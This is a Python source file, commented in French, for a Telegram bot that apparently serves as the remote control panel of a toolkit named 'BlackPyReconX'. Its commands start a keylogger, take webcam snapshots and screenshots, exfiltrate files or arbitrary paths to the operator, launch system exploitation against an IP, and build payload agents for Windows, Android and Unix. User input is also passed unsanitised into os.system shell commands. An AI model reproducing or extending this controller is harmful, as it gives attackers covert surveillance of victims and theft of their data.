# telegram_bot/telegram_bot.py

import os
import asyncio
from pathlib import Path

from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.helpers import escape_markdown

# ✅ Chargement manuel du fichier .env
from dotenv import load_dotenv
load_dotenv()

# 📦 Chargement sécurisé des clés API
from modules.utils import get_api_keys
api = get_api_keys()
TOKEN = api.get("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise EnvironmentError("❌ TELEGRAM_BOT_TOKEN est manquant dans .env")

# 📁 Répertoires du projet
BASE_DIR = Path(__file__).resolve().parent.parent
OUTPUTS = BASE_DIR / "outputs"
SCREENSHOTS = OUTPUTS / "screenshots"
BUILD_DIR = BASE_DIR / "build" / "dist"

# 📲 Application Telegram globale (utilisée dans webhook.py et main.py)
telegram_app = Application.builder().token(TOKEN).build()

# =============================
# ✅ Commandes Telegram Red Team
# =============================

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🕷️ *BlackPyReconX* - Menu des commandes :\n\n"
        "🔍 `/osint <ip|domaine>`\n"
        "🛠️ `/scan <ip>`\n"
        "💥 `/exploit_sys <ip>`\n"
        "📸 `/screenshot`\n"
        "🎹 `/keylogger_start`\n"
        "📷 `/webcam_snap`\n"
        "📤 `/exfiltrate`\n"
        "📂 `/exfiltrate_path <chemin>`\n"
        "🧾 `/rapport`\n"
        "💣 `/set_payload <windows|android|unix>`",
        parse_mode=ParseMode.MARKDOWN
    )

async def osint(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /osint <ip ou domaine>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --osint")
    await send_file_or_error(update, OUTPUTS / "osint.txt", "❌ Fichier OSINT introuvable.")

async def scan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /scan <ip>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --scan")
    await send_file_or_error(update, OUTPUTS / "scan_results.txt", "❌ Résultats de scan introuvables.")

async def exploit_sys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /exploit_sys <ip>")
    cible = context.args[0]
    os.system(f"python main.py --target {cible} --exploit_sys")
    await update.message.reply_text("✅ Exploitation système lancée.")

async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python main.py --screenshot")
    latest = max(SCREENSHOTS.glob("screenshot_*.png"), key=os.path.getmtime, default=None)
    if latest:
        await update.message.reply_document(document=open(latest, "rb"))
    else:
        await update.message.reply_text("❌ Aucune capture trouvée.")

async def keylogger_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python main.py --keylogger")
    await update.message.reply_text("🎹 Keylogger démarré.")

async def webcam_snap(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python main.py --webcam")
    latest = max(SCREENSHOTS.glob("webcam_*.jpg"), key=os.path.getmtime, default=None)
    if latest:
        await update.message.reply_document(document=open(latest, "rb"))
    else:
        await update.message.reply_text("❌ Aucune image webcam trouvée.")

async def exfiltrate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python main.py --exfil")
    await send_file_or_error(update, OUTPUTS / "exfiltrated.zip", "❌ Aucune archive exfiltrée trouvée.")

async def exfiltrate_path(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        return await update.message.reply_text("❗ Usage : /exfiltrate_path <chemin>")
    chemin = " ".join(context.args)
    os.system(f"python main.py --exfiltrate_path \"{chemin}\"")
    chemin_escaped = escape_markdown(chemin, version=2)
    await update.message.reply_text(f"📂 Exfiltration de `{chemin_escaped}` terminée.", parse_mode=ParseMode.MARKDOWN_V2)

async def rapport(update: Update, context: ContextTypes.DEFAULT_TYPE):
    os.system("python main.py --rapport")
    await send_file_or_error(update, OUTPUTS / "rapport_final.txt", "❌ Rapport introuvable.")

async def set_payload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or context.args[0] not in ["windows", "android", "unix"]:
        return await update.message.reply_text("❗ Usage : /set_payload <windows|android|unix>")
    target = context.args[0]
    os.system(f"python build/packager.py --target {target}")
    payload_name = {
        "windows": "agent_win.exe",
        "android": "agent_android.py",
        "unix": "agent_linux.py"
    }.get(target)
    path = BUILD_DIR / payload_name
    await send_file_or_error(update, path, "❌ Échec de la génération du payload.")

# =============================
# 📦 Fonction utilitaire commune
# =============================

async def send_file_or_error(update, path: Path, error_msg: str):
    if path.exists():
        try:
            with open(path, "rb") as f:
                await update.message.reply_document(document=f)
        except Exception as e:
            print(f"❌ Erreur envoi document : {e}")
            await update.message.reply_text("⚠️ Envoi du fichier échoué.")
    else:
        await update.message.reply_text(error_msg)

# =============================
# ✅ Enregistrement des handlers
# =============================

telegram_app.add_handler(CommandHandler("menu", menu))
telegram_app.add_handler(CommandHandler("osint", osint))
telegram_app.add_handler(CommandHandler("scan", scan))
telegram_app.add_handler(CommandHandler("exploit_sys", exploit_sys))
telegram_app.add_handler(CommandHandler("screenshot", screenshot))
telegram_app.add_handler(CommandHandler("keylogger_start", keylogger_start))
telegram_app.add_handler(CommandHandler("webcam_snap", webcam_snap))
telegram_app.add_handler(CommandHandler("exfiltrate", exfiltrate))
telegram_app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
telegram_app.add_handler(CommandHandler("rapport", rapport))
telegram_app.add_handler(CommandHandler("set_payload", set_payload))
